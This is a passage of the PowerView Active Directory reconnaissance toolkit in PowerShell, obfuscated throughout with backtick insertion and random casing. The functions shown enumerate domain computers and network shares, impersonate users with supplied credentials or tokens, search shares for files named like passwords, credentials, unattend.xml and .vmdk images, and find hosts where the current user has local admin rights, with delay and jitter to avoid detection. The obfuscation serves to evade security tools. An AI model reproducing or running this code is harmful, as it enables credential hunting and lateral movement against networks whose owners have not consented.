                if (${RES`Ult} -and ${StoP`ONs`UCcESS}) {
                    wRIte-ve`R`BoSE "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            wR`Ite-`V`E`RBOsE "[Find-DomainUserEvent] Using threading with threads: $Threads"

            
            ${ScRI`p`TPA`RAMS} = @{
                'StartTime' = ${s`TA`RTtIME}
                'EndTime' = ${E`NdTi`me}
                'MaxEvents' = ${maXe`V`eNtS}
                'TargetUsers' = ${TarGE`T`U`sERs}
                'Filter' = ${FIL`T`Er}
                'Credential' = ${C`REDe`N`TIal}
            }

            
            NeW-T`h`ReadedfU`NC`T`iON -ComputerName ${t`Ar`G`EtcoMPUTerS} -ScriptBlock ${HO`STE`N`UM`BLOck} -ScriptParameters ${SCr`ip`TParA`MS} -Threads ${tH`Re`Ads}
        }
    }
}


function FiNd-Do`Main`S`H`Are {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('DNSHostName')]
        [String[]]
        ${cOmputE`RnA`me},

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        ${CO`Mp`UTE`Rd`omaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OM`p`UT`E`RlDa`PFiLTer},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mp`U`TERseA`RCHb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${coMp`Ut`ER`OpeRaT`i`NgsY`SteM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${co`mpUtERS`E`Rv`ICEPACk},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${c`om`PuTErSIt`E`N`Ame},

        [Alias('CheckAccess')]
        [Switch]
        ${cH`EcksHA`ReAc`cESS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RVER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sE`AR`ChScOpe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`s`ULtPagesizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`Erver`TiM`el`Imit},

        [Switch]
        ${TOmB`s`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdE`N`T`IAl} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${d`ELAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`iTteR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thR`E`AdS} = 20
    )

    BEGIN {

        ${ComPu`TErSe`A`R`cHEraR`gUMeNTS} = @{
            'Properties' = 'dnshostname'
        }
        if (${pSb`oun`Dp`ArAm`E`TERs}['ComputerDomain']) { ${c`ompUt`eR`sEA`Rc`H`eraRguMen`TS}['Domain'] = ${c`omPUt`e`R`DOMaIN} }
        if (${pSbo`U`NDpAramEt`E`RS}['ComputerLDAPFilter']) { ${cOM`p`Ut`erS`Ea`RCHeRA`RGUM`eNts}['LDAPFilter'] = ${COmP`UteRLdAP`Filt`Er} }
        if (${PS`Bou`N`dPAr`A`mEtErS}['ComputerSearchBase']) { ${C`omp`UTERSear`Ch`eRar`G`UmENTs}['SearchBase'] = ${cO`MP`Ut`E`RsEArch`BAse} }
        if (${psb`o`UNDP`A`RamEt`erS}['Unconstrained']) { ${CoMPut`ersE`ARCherArG`UM`eN`Ts}['Unconstrained'] = ${uN`co`NsTRaI`Ned} }
        if (${pS`BOuNdpar`AM`ete`RS}['ComputerOperatingSystem']) { ${cO`mpU`TErS`EarcHE`RaRgume`N`Ts}['OperatingSystem'] = ${o`p`ERaT`inGs`Y`sTem} }
        if (${P`sboU`NDP`AR`AmeTeRs}['ComputerServicePack']) { ${cO`mPu`TERSE`A`RChErarGUme`NTS}['ServicePack'] = ${S`eR`VICEpA`ck} }
        if (${PsBOu`N`Dpa`RA`MeT`eRS}['ComputerSiteName']) { ${COmPu`Te`Rse`ArC`HE`RAR`GuM`E`NTs}['SiteName'] = ${sITe`NA`me} }
        if (${pS`B`ouNDpa`RA`me`TeRS}['Server']) { ${Co`m`PU`TeRsE`ARChERarguM`entS}['Server'] = ${s`eR`VeR} }
        if (${p`sBOU`NDpAraMeTe`Rs}['SearchScope']) { ${c`O`mpuTER`SeARChE`Rarg`U`meNTs}['SearchScope'] = ${s`eARc`Hs`CoPE} }
        if (${PsBOUn`dP`Aram`eTE`Rs}['ResultPageSize']) { ${ComputErs`E`AR`CheRaR`Gu`MeNTs}['ResultPageSize'] = ${r`ESUltP`AGeSI`ze} }
        if (${P`sbOUN`DPAr`AME`TerS}['ServerTimeLimit']) { ${COMpU`TERs`E`ARche`RARgu`ments}['ServerTimeLimit'] = ${S`Erve`RtIME`lIm`IT} }
        if (${P`SboUN`DpAra`m`eTERs}['Tombstone']) { ${C`OMPuTer`seaRCHeRa`R`GumE`NtS}['Tombstone'] = ${toMB`S`To`NE} }
        if (${psbO`UnDP`ARAME`Te`Rs}['Credential']) { ${cOMpUTE`Rs`E`ArCHeRaRgu`meNTS}['Credential'] = ${CrEde`Nt`iAl} }

        if (${P`SbO`UN`DparameTE`RS}['ComputerName']) {
            ${T`A`R`geTCoMp`UtERs} = ${c`oM`pu`TerNAme}
        }
        else {
            wR`ITE-ver`BosE '[Find-DomainShare] Querying computers in the domain'
            ${TA`RGE`T`cOmPuT`Ers} = G`Et-DOm`A`iNcoM`PutEr @ComputerSearcherArguments | sel`E`Ct-oB`ject -ExpandProperty dNs`H`osT`NaME
        }
        w`R`ItE-vEr`BoSE "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if (${tArGEtCOMP`U`TeRs}.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        
        ${hOStENUm`Bl`oCK} = {
            Param(${co`mpuTerna`Me}, ${CheC`ksHaR`eA`Cce`SS}, ${To`K`enH`ANdle})

            if (${t`okenHand`lE}) {
                
                ${N`Ull} = In`VokE`-UseRIm`P`erSONAtION -TokenHandle ${TO`kE`NHAN`DlE} -Quiet
            }

            ForEach (${t`ARge`Tc`OmPU`TEr} in ${co`MpUTe`RN`AmE}) {
                ${Up} = t`eSt-conN`eCt`Ion -Count 1 -Quiet -ComputerName ${TArGeTc`oMP`U`T`er}
                if (${Up}) {
                    
                    ${SHaR`eS} = G`eT-NET`Sh`ARe -ComputerName ${TaR`GETco`M`PU`TER}
                    ForEach (${Sh`A`Re} in ${sH`AR`Es}) {
                        ${S`haR`Ename} = ${s`HARe}.Name
                        
                        ${P`AtH} = '\\'+${targEtCo`Mp`UTer}+'\'+${SHA`R`eNAMe}

                        if ((${SH`ArEna`me}) -and (${SHAr`En`AMe}.trim() -ne '')) {
                            
                            if (${C`heCKS`harea`C`CesS}) {
                                
                                try {
                                    ${n`ULL} = [IO.Directory]::GetFiles(${Pa`TH})
                                    ${S`haRe}
                                }
                                catch {
                                    Wri`T`e-veRBO`SE "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                ${s`HARE}
                            }
                        }
                    }
                }
            }

            if (${T`o`KEnhAN`DLe}) {
                iNvOkE-R`eV`erTTos`E`lf
            }
        }

        ${l`OgOn`TokEn} = ${n`ULl}
        if (${PsBoU`ND`param`Et`Ers}['Credential']) {
            if (${psb`Oun`d`PArAMETe`Rs}['Delay'] -or ${p`SbOundPa`R`AMETE`RS}['StopOnSuccess']) {
                ${LOG`o`NtoKEN} = inVoke-USeR`IM`Perso`NAt`Ion -Credential ${cRe`D`enT`IAl}
            }
            else {
                ${lOg`on`TOkEn} = iN`Vo`Ke`-`U`seRIMpE`RSONatIOn -Credential ${CreD`e`NtiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${p`S`BOu`NDpA`RAmEte`RS}['Delay'] -or ${pSb`oUnDpaR`Amet`eRs}['StopOnSuccess']) {

            Wri`TE-v`E`RBOse "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            WR`i`TE-VeRbOSe "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            ${C`O`UNteR} = 0
            ${rAnd`NO} = n`E`W-OBjEct SY`STem.rAN`D`OM

            ForEach (${TArGetCO`M`Pu`TeR} in ${t`AR`geTcOM`putERS}) {
                ${cOu`N`Ter} = ${CO`Un`TEr} + 1

                
                StA`RT`-sl`EeP -Seconds ${Ra`Nd`No}.Next((1-${jIT`TER})*${DeL`AY}, (1+${j`ItTeR})*${D`EL`Ay})

                WRIt`e-v`e`RboSE "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                InVOk`E`-CO`MMAND -ScriptBlock ${Ho`St`ENUM`B`lOcK} -ArgumentList ${t`Ar`GET`coM`PuTEr}, ${CheCK`s`h`ArEaC`cess}, ${lo`goNT`o`KEN}
            }
        }
        else {
            wrIte-`VEr`BO`SE "[Find-DomainShare] Using threading with threads: $Threads"

            
            ${SCR`ip`TPaRa`Ms} = @{
                'CheckShareAccess' = ${chEC`k`s`haReacCEsS}
                'TokenHandle' = ${LogO`N`TO`kEn}
            }

            
            nEW-tHREA`de`Dfu`Nct`IoN -ComputerName ${tAR`GetCO`mP`Ute`RS} -ScriptBlock ${hos`TE`N`U`MBlock} -ScriptParameters ${sCRIPt`pa`RaMS} -Threads ${T`HreADs}
        }
    }

    END {
        if (${L`oGO`Nt`OkEn}) {
            InvOKE`-Re`V`e`RttOSELf -TokenHandle ${L`Og`ONtoKEN}
        }
    }
}


function F`IND`-`i`Nt`erEstiN`GdO`maINSHArE`File {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('DNSHostName')]
        [String[]]
        ${cOm`Puter`NAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`o`MPuTerdo`m`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOmPutEr`Ld`APF`ilTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`Om`PUtERS`eArC`hba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${CoMP`UtER`O`P`Er`A`T`ingSystEM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${comP`UTeRS`ERvi`cEPacK},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${co`MP`U`TeRsitEnA`mE},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        ${InC`LuDE} = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        ${sh`Arepa`Th},

        [String[]]
        ${ExclUDE`ds`H`ArEs} = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LAsTacce`s`ST`i`ME},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${las`Twr`ItEtIMe},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${C`REAtioN`Time},

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        ${ofFic`e`D`oCS},

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        ${F`Re`s`hEXes},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`eRveR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${seARC`hSc`ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rESulTP`AGe`Si`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVEr`Ti`MEli`MIt},

        [Switch]
        ${to`MBSTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EdenTI`Al} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${D`ElaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Ji`Tt`Er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thR`eA`dS} = 20
    )

    BEGIN {
        ${cOMpU`TE`Rs`EaRCHe`RAr`gU`MEN`Ts} = @{
            'Properties' = 'dnshostname'
        }
        if (${p`SB`oUNDParAM`Eters}['ComputerDomain']) { ${c`OmPuterseARc`h`eRARg`U`m`en`Ts}['Domain'] = ${C`Om`puT`ERdOmaIN} }
        if (${PsB`oUn`dPAr`Am`eTe`RS}['ComputerLDAPFilter']) { ${CO`MpUt`er`se`Arc`hERAr`gUMENTS}['LDAPFilter'] = ${cOmP`U`Te`Rl`dApfil`Ter} }
        if (${PSbo`U`NdpaR`AmeT`ERS}['ComputerSearchBase']) { ${C`omP`UTers`EarcH`erarGuMEn`Ts}['SearchBase'] = ${COMpU`T`ErsEA`RchB`Ase} }
        if (${P`sBOuNd`pA`RAMetE`Rs}['ComputerOperatingSystem']) { ${c`oMpUt`e`R`SearcheRARg`UM`ENts}['OperatingSystem'] = ${OP`ERATI`N`G`SYS`Tem} }
        if (${pSboun`dp`A`RAmEte`RS}['ComputerServicePack']) { ${c`OmPutErs`EaRCheR`ARguME`NTs}['ServicePack'] = ${Se`RV`i`cEPAcK} }
        if (${pS`Bou`N`Dp`Aram`EtERs}['ComputerSiteName']) { ${CoMPUtERs`EA`RcHErA`Rgume`Nts}['SiteName'] = ${S`i`TeNA`ME} }
        if (${PsBOU`ND`p`ARAMEte`RS}['Server']) { ${COMPuT`E`RS`eaRCHE`RARGuM`ENtS}['Server'] = ${SeR`VeR} }
        if (${psB`ound`par`AMetERs}['SearchScope']) { ${COMpuT`ERSEaRChErarG`U`MEn`Ts}['SearchScope'] = ${seA`Rch`ScoPE} }
        if (${pSBo`UNDP`Ar`A`mEtErs}['ResultPageSize']) { ${COm`PUT`eRse`ArChE`R`Arg`Um`eNts}['ResultPageSize'] = ${R`eS`ULTPAGES`IZE} }
        if (${p`sB`OunD`PARa`mEtERS}['ServerTimeLimit']) { ${cOm`pu`TE`RsE`ARchERARGuMEN`Ts}['ServerTimeLimit'] = ${sE`RVERTi`Me`Lim`It} }
        if (${ps`B`oUN`DpaRAme`TeRs}['Tombstone']) { ${cO`mPUtEr`Sea`RCheRARGUMEn`TS}['Tombstone'] = ${tO`Mbs`ToNE} }
        if (${PSB`o`UND`ParAMetErs}['Credential']) { ${COmpUte`RSeARC`herA`R`GuMENtS}['Credential'] = ${CrEDEn`TI`AL} }

        if (${P`sbOUndParamEt`E`RS}['ComputerName']) {
            ${T`ARGeTc`om`Pute`RS} = ${cOm`PUT`e`RnAMe}
        }
        else {
            W`RI`TE-vErbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            ${taRg`EtCOmpu`Te`Rs} = geT`-dO`MAIN`Co`MPUTER @ComputerSearcherArguments | sELECT`-obj`E`CT -ExpandProperty dnSHo`St`NamE
        }
        W`RI`TE-V`eR`BOsE "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if (${tA`R`GetcOmpU`Ters}.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        
        ${hO`St`en`UmblO`ck} = {
            Param(${co`mPU`T`eRN`AME}, ${iNCl`U`dE}, ${eX`Cl`UdeDs`HaREs}, ${officEd`O`CS}, ${E`xCLUd`eHi`D`DEN}, ${Fr`eShEX`eS}, ${ChEcKW`Ri`T`eA`cCE`SS}, ${ToK`Enh`An`dLE})

            if (${t`OkEN`HANDLe}) {
                
                ${n`ULL} = I`Nv`okE-uS`er`imPeRsonatIOn -TokenHandle ${tokEn`HA`NDLe} -Quiet
            }

            ForEach (${ta`RG`et`cOmputEr} in ${comp`U`TErnamE}) {

                ${S`Ea`R`cHs`hAReS} = @()
                if (${TA`RGeT`c`omp`UtEr}.StartsWith('\\')) {
                    
                    ${S`EArcH`SHArEs} += ${TA`RgEt`coM`PutER}
                }
                else {
                    ${U`p} = tesT-CONN`EcTI`on -Count 1 -Quiet -ComputerName ${TArGET`coMp`UT`eR}
                    if (${U`p}) {
                        
                        ${s`hAR`eS} = GET-`N`eTs`harE -ComputerName ${targetC`oMPUT`Er}
                        ForEach (${sH`A`RE} in ${s`harEs}) {
                            ${SHAreN`A`ME} = ${sh`A`Re}.Name
                            ${p`Ath} = '\\'+${TArGETcom`PUT`er}+'\'+${SHAr`eNA`Me}
                            
                            if ((${Sh`A`RenamE}) -and (${shAr`ENA`me}.Trim() -ne '')) {
                                
                                if (${eX`ClUdEDsh`AREs} -NotContains ${Sh`ArE`NaME}) {
                                    
                                    try {
                                        ${nU`LL} = [IO.Directory]::GetFiles(${P`ATh})
                                        ${SEa`RC`HshAREs} += ${PA`Th}
                                    }
                                    catch {
                                        WRiT`e-v`e`RB`oSE "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${Sh`ARe} in ${seAr`cHsHAr`ES}) {
                    WRIt`E`-`Verb`oSe "Searching share: $Share"
                    ${SEArchA`R`gS} = @{
                        'Path' = ${s`hare}
                        'Include' = ${I`NCL`Ude}
                    }
                    if (${OfFIC`E`DoCS}) {
                        ${S`E`ARCHARgS}['OfficeDocs'] = ${Of`Fi`cedOCS}
                    }
                    if (${F`ReS`heXes}) {
                        ${S`earC`har`GS}['FreshEXEs'] = ${Fr`eShE`Xes}
                    }
                    if (${Last`AcC`ESST`iMe}) {
                        ${s`eaRc`H`ArGs}['LastAccessTime'] = ${LAstACCes`ST`IMe}
                    }
                    if (${L`ASt`wR`iteTiMe}) {
                        ${SEaR`Ch`A`RgS}['LastWriteTime'] = ${LaS`TWRiTEt`ImE}
                    }
                    if (${c`RE`AtIo`N`TIme}) {
                        ${S`e`A`RChargs}['CreationTime'] = ${c`ReAtIontI`Me}
                    }
                    if (${ChEC`kwR`itE`A`ccESS}) {
                        ${se`A`RCh`ARGs}['CheckWriteAccess'] = ${cHe`CKWRiTe`A`Cc`ess}
                    }
                    fiNd-`i`NT`ER`Est`INgfiLE @SearchArgs
                }
            }

            if (${ToKEnH`A`NdLE}) {
                InvO`K`E`-ReVE`RTT`ose`LF
            }
        }

        ${L`O`GOntOk`EN} = ${n`ULl}
        if (${PSBOun`Dp`AR`Ame`Ters}['Credential']) {
            if (${p`s`BOU`ND`P`ARAMEtErs}['Delay'] -or ${pS`B`Oun`dpA`Ram`eTERS}['StopOnSuccess']) {
                ${LOGo`N`TO`KEN} = I`NVO`k`E-Us`eRI`MpERSo`NatIoN -Credential ${CreDEN`T`i`AL}
            }
            else {
                ${lO`G`oNtO`keN} = iNVoK`e-use`Rim`P`eRsonAt`IoN -Credential ${C`R`edentIAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PSb`Ou`Nd`PARA`MeTE`Rs}['Delay'] -or ${PSBou`NDp`A`Ra`mETERS}['StopOnSuccess']) {

            wr`itE-`VER`BOsE "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            w`Rite-Ve`RboSe "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            ${cOUn`T`er} = 0
            ${R`A`NdNo} = Ne`w-`O`BJEct SY`sTeM`.Ra`N`doM

            ForEach (${TArGe`TCOmp`U`TeR} in ${T`AR`Get`COmpuTErs}) {
                ${CO`Un`TEr} = ${c`ou`NtEr} + 1

                
                s`TArt-s`L`EEp -Seconds ${R`A`NDNo}.Next((1-${j`iTteR})*${dEL`AY}, (1+${Ji`T`TER})*${D`EL`Ay})

                wri`TE-VErB`oSE "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                iNvOKE`-Co`mmANd -ScriptBlock ${Ho`STeNuM`BLOcK} -ArgumentList ${tArG`eT`c`OMp`UtEr}, ${iNC`l`Ude}, ${Exc`l`U`D`eDshaRES}, ${O`FFIcedo`Cs}, ${EX`Cl`UDEHiDdEn}, ${frE`S`h`exEs}, ${CHEcKWritE`AC`c`E`sS}, ${Lo`gonTO`KEN}
            }
        }
        else {
            wriT`E-Ve`RbO`SE "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            
            ${s`cRI`Pt`PARaMs} = @{
                'Include' = ${INC`lU`de}
                'ExcludedShares' = ${EX`cl`UdEDS`hAr`Es}
                'OfficeDocs' = ${Off`i`cedOcS}
                'ExcludeHidden' = ${EXClUDEh`i`ddEn}
                'FreshEXEs' = ${F`Res`HexES}
                'CheckWriteAccess' = ${CH`eckwr`IT`ea`C`cEsS}
                'TokenHandle' = ${LOgONT`O`K`en}
            }

            
            neW-`T`h`REA`deDfuNCT`iON -ComputerName ${TA`RG`eTC`omputers} -ScriptBlock ${Host`e`N`Um`BlOCK} -ScriptParameters ${Scr`Ipt`paramS} -Threads ${th`R`eADs}
        }
    }

    END {
        if (${lO`GONtO`Ken}) {
            INVOKE`-`R`Evert`TOSElf -TokenHandle ${L`oGo`N`TOkeN}
        }
    }
}


function FIN`d`-lo`c`AL`AdMiNA`CceSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('DNSHostName')]
        [String[]]
        ${c`OMputerNa`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoM`Pu`TERd`omaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`Ompu`Terl`DaPFilT`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmP`UterS`E`ARc`hb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${C`ompu`Ter`oPERa`TIngSy`steM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${c`omPuteRS`erv`IcE`p`Ack},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${C`oMPU`TeRsIT`EnAMe},

        [Switch]
        ${chEc`kSHAreA`Cc`esS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RvEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEARchs`cO`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsuL`TPag`esIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RveRTim`el`I`MIt},

        [Switch]
        ${T`Omb`STO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDeNTIAl} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${d`el`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jitt`Er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${threa`DS} = 20
    )

    BEGIN {
        ${c`OmP`Ut`eR`SeArCh`ErA`R`gumeNTs} = @{
            'Properties' = 'dnshostname'
        }
        if (${p`sboun`D`paramEtE`Rs}['ComputerDomain']) { ${cOMpu`TE`RS`EA`Rc`He`RaRgumenTs}['Domain'] = ${cO`M`pU`TE`RDOMAIn} }
        if (${P`S`BOUN`D`parAmeterS}['ComputerLDAPFilter']) { ${C`o`mpuTe`RSEarChERAR`G`UmeNTs}['LDAPFilter'] = ${co`MputeR`l`da`P`FIltER} }
        if (${p`s`Bo`U`NdpA`RAMEteRs}['ComputerSearchBase']) { ${coMPUt`ErsE`ARc`he`RAR`Gu`MENts}['SearchBase'] = ${cOmP`UteRSe`A`RChbasE} }
        if (${psbouNDp`Ara`MET`ers}['Unconstrained']) { ${cO`M`pUtERS`ea`RchEr`ArgUments}['Unconstrained'] = ${UN`cOn`s`Train`eD} }
        if (${p`SBou`N`D`pARAm`EtERs}['ComputerOperatingSystem']) { ${coMp`Uterse`ARch`E`RAr`Gu`MENTS}['OperatingSystem'] = ${op`erAT`I`NgSyS`T`em} }
        if (${P`Sb`oUNdpAraMe`T`ers}['ComputerServicePack']) { ${cOMp`UTeRSEAr`CH`erAr`gumEn`Ts}['ServicePack'] = ${SE`R`ViCE`PAcK} }
        if (${Psbo`UnD`pARAMetE`RS}['ComputerSiteName']) { ${co`Mp`Ute`R`seArCherArG`UME`NTS}['SiteName'] = ${siT`e`NAmE} }
        if (${PSBO`UNDp`ArA`me`Te`Rs}['Server']) { ${C`O`MPUt`eR`S`EARCher`ArgUM`entS}['Server'] = ${serV`ER} }
        if (${PsBOUn`d`P`A`RamETErS}['SearchScope']) { ${cOm`P`Ute`RSe`ARch`ER`ArgUmen`Ts}['SearchScope'] = ${s`ear`CHscO`Pe} }
        if (${p`sb`o`UNDpaRAmET`eRs}['ResultPageSize']) { ${COmPuT`eRs`E`A`RCheRar`gUM`eNTS}['ResultPageSize'] = ${resU`LTpA`gE`si`ZE} }
        if (${Ps`BoUn`DpARAMet`e`RS}['ServerTimeLimit']) { ${c`O`MPUTerse`A`R`ChERArGuME`NtS}['ServerTimeLimit'] = ${SERve`RtimE`Lim`IT} }
        if (${pSb`ouN`d`PAR`AmEteRS}['Tombstone']) { ${co`MpUte`Rse`A`RcHe`RarGUM`enTS}['Tombstone'] = ${T`OMBs`TONe} }
        if (${PSBO`UN`dPA`RaMEteRS}['Credential']) { ${COM`P`UTe`R`SEArChERa`RG`UmEnts}['Credential'] = ${Creden`T`i`AL} }

        if (${P`SBounDP`A`RaMe`T`Ers}['ComputerName']) {
            ${TA`RGET`Co`MpUtErs} = ${C`O`MPu`TERnaME}
        }
        else {
            wRI`TE-v`eR`BOSe '[Find-LocalAdminAccess] Querying computers in the domain'
            ${tARgeT`co`m`PuTErS} = G`ET`-dO`mAINCOM`P`Uter @ComputerSearcherArguments | SE`LE`cT-Obj`ecT -ExpandProperty dn`sh`oSTnAMe
        }
        Wr`ItE-`VER`BOsE "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if (${t`Arg`etC`oMpute`Rs}.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        
        ${h`o`StENUmblO`Ck} = {
            Param(${cOM`Pu`TeRname}, ${TOke`N`HA`NDLe})

            if (${t`O`Ke`NHanDlE}) {
                
                ${nU`Ll} = inV`OKe-uS`eRI`Mper`sonATI`On -TokenHandle ${TokE`NHaNd`le} -Quiet
            }

            ForEach (${ta`R`GEtCom`pUT`ER} in ${CompuTE`Rna`ME}) {
                ${up} = Test-c`ON`NEction -Count 1 -Quiet -ComputerName ${targ`E`TCOm`PUter}
                if (${Up}) {
                    
                    ${ac`CESS} = Te`s`T-`ADMInAcC`esS -ComputerName ${TaRg`EtC`omP`UT`er}
                    if (${aC`cEss}.IsAdmin) {
                        ${Ta`RGeT`co`mpuT`Er}
                    }
                }
            }

            if (${T`oKe`NHAnD`lE}) {
                INV`Oke-reVe`RttO`S`elF
            }
        }

        ${l`OgONt`OKEn} = ${N`ULL}
        if (${P`sb`ounDParamet`eRS}['Credential']) {
            if (${P`SB`OuNdpaRam`e`T`ERS}['Delay'] -or ${P`s`BOundpARAme`Ters}['StopOnSuccess']) {
                ${L`OgONtOk`En} = In`VokE-`UsEri`mP`ErsONATIon -Credential ${Cre`d`ENT`iaL}
            }
            else {
                ${l`OgOntok`En} = INVOk`E-`USer`iMpERSO`NaTi`ON -Credential ${CREd`ENT`IaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${Ps`BOU`ND`ParAm`ET`ERS}['Delay'] -or ${PS`B`o`UnDPar`AMEtERS}['StopOnSuccess']) {

            WrITe-`VeR`BOsE "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write`-V`ERBOse "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            ${c`O`UnTer} = 0
            ${R`AN`dNO} = nEw`-o`Bje`ct syStE`m.RAND`Om

            ForEach (${T`Arg`etcO`mPuteR} in ${tA`RG`e`Tco`mpUters}) {
                ${c`o`UNter} = ${C`Ou`NTeR} + 1

                
                s`TARt-SLE`eP -Seconds ${Ra`N`dnO}.Next((1-${J`I`Tter})*${dE`l`AY}, (1+${jI`TtEr})*${de`LaY})

                wrIT`E-VErB`ose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                IN`VokE-c`OMma`ND -ScriptBlock ${h`oS`TeNUmblOck} -ArgumentList ${ta`RGeT`COMpu`TER}, ${L`OGon`TOKEn}
            }
        }
        else {
            w`R`ItE-VErb`O`Se "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            
            ${sCRIP`TPA`Ra`MS} = @{
                'TokenHandle' = ${L`OGo`N`TokEN}
            }

            
            NEw-THR`ea`DedFUNcti`On -ComputerName ${Targ`Et`c`OMPUT`eRs} -ScriptBlock ${hos`TE`NuM`BLOcK} -ScriptParameters ${ScR`iPTParA`Ms} -Threads ${T`Hrea`dS}
        }
    }
}


function FInd-dO`mAinlo`CAlGRO`U`Pme`M`BEr {


